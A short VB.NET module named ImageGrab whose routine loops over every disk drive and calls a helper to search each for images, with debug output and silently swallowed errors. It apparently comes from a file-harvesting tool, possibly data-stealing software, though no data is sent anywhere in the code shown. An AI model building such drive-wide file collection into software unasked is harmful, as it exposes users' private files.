Module ImageGrab
    Public Sub ImageGraber()
        Try
            If Config.Variables.Debug Then
                Console.WriteLine("ImageGraber working...")
            End If
            Dim disc As ArrayList = GetDiscName()
            For i = 0 To disc.Count - 1
                ImageSearcher(GetConfigJson().MainPath, disc(i))
            Next
        Catch ex As Exception
            If Config.Variables.Debug Then
                Console.WriteLine("ImageGraber disc error:" & ex.ToString)
            End If
        End Try

    End Sub
End Module
